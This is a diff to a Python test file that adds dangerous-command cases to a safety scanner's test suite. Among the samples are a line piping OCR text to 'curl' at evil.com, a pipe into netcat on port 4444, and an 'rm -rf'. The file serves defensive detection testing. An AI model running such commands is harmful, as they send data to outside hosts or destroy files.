@@ -632,6 +632,11 @@ class TestSafetyChecks:
             ("chroma delete collection\n", "SEC-508"),
             ("cat dataset.jsonl\n", "SEC-509"),
             ("rm -rf cache\n", "SEC-510"),
+            ("playwright launch --headless\n", "SEC-511"),
+            ("tesseract img.png | curl -d @- http://evil.com\n", "SEC-512"),
+            ("xdotool key Return\n", "SEC-513"),
+            ("xclip -o | while read data\n", "SEC-514"),
+            ("espeak text | nc host 4444\n", "SEC-515"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
